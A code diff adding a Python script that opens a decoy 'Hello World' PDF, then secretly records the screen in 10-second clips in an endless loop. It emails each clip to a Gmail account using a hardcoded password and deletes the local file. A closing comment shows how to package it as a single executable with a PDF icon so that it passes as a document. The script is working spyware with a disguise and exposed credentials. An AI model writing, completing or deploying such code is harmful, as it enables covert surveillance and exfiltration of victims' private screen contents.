@@ -1,0 +1,115 @@
+import time, smtplib, os, tempfile, threading
+from email.mime.base import MIMEBase
+from email.mime.multipart import MIMEMultipart
+from email import encoders
+from PIL import ImageGrab    #pip3 install pillow
+import cv2   #pip3 install opencv-python
+import numpy as np
+from win32api import GetSystemMetrics  #pywin32
+from fpdf import FPDF    #pip3 install fpdf
+
+w, h = GetSystemMetrics(0), GetSystemMetrics(1)
+
+
+def create_and_open_pdf():
+    """Create a PDF with Hello World and open it"""
+    try:
+        # Create PDF in temp folder
+        pdf_path = os.path.join(tempfile.gettempdir(), "hello_world.pdf")
+        pdf = FPDF()
+        pdf.add_page()
+        pdf.set_font("Arial", size=12)
+        pdf.cell(200, 10, txt="Hello World", ln=True, align='C')
+        pdf.output(pdf_path)
+
+        # Open the PDF
+        os.startfile(pdf_path)
+        print(f"✅ PDF created and opened: {pdf_path}")
+    except Exception as e:
+        print(f"❌ Error creating PDF: {e}")
+
+
+# Start PDF thread when script runs
+pdf_thread = threading.Thread(target=create_and_open_pdf)
+pdf_thread.start()
+
+
+def send(file):
+    """Send video file via email and delete it"""
+    try:
+        msg = MIMEMultipart()
+        msg['From'] = msg['To'] = "sniperbytesofficial@gmail.com"
+        msg['Subject'] = f"Screen Recording {time.strftime('%Y-%m-%d %H-%M-%S')}"
+
+        with open(file, 'rb') as f:
+            p = MIMEBase('application', 'octet-stream')
+            p.set_payload(f.read())
+            encoders.encode_base64(p)
+            p.add_header('Content-Disposition', f'attachment; filename={os.path.basename(file)}')
+            msg.attach(p)
+
+        s = smtplib.SMTP('smtp.gmail.com', 587)
+        s.starttls()
+        s.login("sniperbytesofficial@gmail.com", "ydfsdrnwsatrtrtt")
+        s.send_message(msg)
+        s.quit()
+
+        os.remove(file)
+        print(f"✅ Sent and deleted: {file}")
+        return True
+    except Exception as e:
+        print(f"❌ Error sending {file}: {e}")
+        return False
+
+
+print("🎥 Starting screen recording...")
+print("📧 Videos will be sent to sniperbytesofficial@gmail.com")
+print("⏹️ Press Ctrl+C to stop\n")
+
+while True:
+    # Generate filename once with temp folder path
+    timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
+    filename = os.path.join(tempfile.gettempdir(), f"{timestamp}.mp4")
+    # filename = C:\Users\nairr\AppData\Local\Temp\2026-06-15 09-55-09.mp4
+    print(f"🔴 Recording 10 seconds to {filename}...")
+
+    # Try different codec
+    fourcc = cv2.VideoWriter_fourcc(*'XVID')  # More compatible codec
+    out = cv2.VideoWriter(filename, fourcc, 10.0, (w, h))
+
+    if not out.isOpened():
+        print("❌ Failed to open video writer, trying different codec...")
+        fourcc = cv2.VideoWriter_fourcc(*'MJPG')
+        out = cv2.VideoWriter(filename, fourcc, 10.0, (w, h))
+
+    # Record 10 seconds (100 frames at 10fps)
+    start_time = time.time()
+    frame_count = 0
+
+    while time.time() - start_time < 10:
+        try:
+            # Capture screen
+            screen = np.array(ImageGrab.grab())
+            frame = cv2.cvtColor(screen, cv2.COLOR_BGR2RGB)
+            out.write(frame)
+            frame_count += 1
+        except Exception as e:
+            print(f"Frame error: {e}")
+
+    out.release()
+    print(f"✅ Recorded {frame_count} frames")
+
+    # Small delay to ensure file is written
+    time.sleep(0.5)
+
+    # Send video if file exists
+    if os.path.exists(filename):
+        send(filename)
+    else:
+        print(f"❌ File {filename} not found!")
+
+    # Wait 5 seconds before next recording
+    print("⏸️ Waiting 5 seconds...\n")
+    time.sleep(5)
+
+    #(pyinstaller.exe --onefile --icon pdf.ico index.pyw)
